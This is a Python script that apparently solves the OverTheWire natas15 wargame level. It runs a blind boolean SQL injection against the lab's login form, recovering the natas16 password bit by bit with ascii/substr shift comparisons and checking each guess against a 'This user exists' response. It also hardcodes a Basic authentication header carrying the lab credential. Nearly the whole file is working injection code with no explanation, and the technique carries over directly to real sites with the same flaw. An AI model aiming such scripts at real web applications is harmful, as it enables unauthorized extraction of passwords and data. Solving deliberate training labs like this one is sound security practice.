import requests


def check(response):
	if 'This user exists' in response:
		return True
	return False


url = "http://natas15.natas.labs.overthewire.org/index.php"

payload = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n"
headers = {
    'content-type': "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
    'Authorization': "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
    }



l = 1
flag = ''
verify = 'false'
while (check(verify) == False):
	letter = ''
	candidate = ''
	for i in range(6, -1, -1):
		candidate = letter + '0'
		sqli = "natas16\" and (ascii(substr(password,"+str(l)+",1)) >> "+str(i)+")="+ str(int(candidate,2))+"#"
		# print(sqli)
		# print(sqli)
		response = requests.request("POST", url, data=payload+sqli, headers=headers)
		# print(response.text)
		if check(response.text):
			letter += '0'
		else:
			letter += '1'

		print(letter)

	l+=1

	flag += chr(int(letter,2))
	print('Flag: ' + flag)
	sql = 'natas16\" and password = \"'+ flag
	response = requests.request("POST", url, data=payload+sql, headers=headers)
	verify=response.text


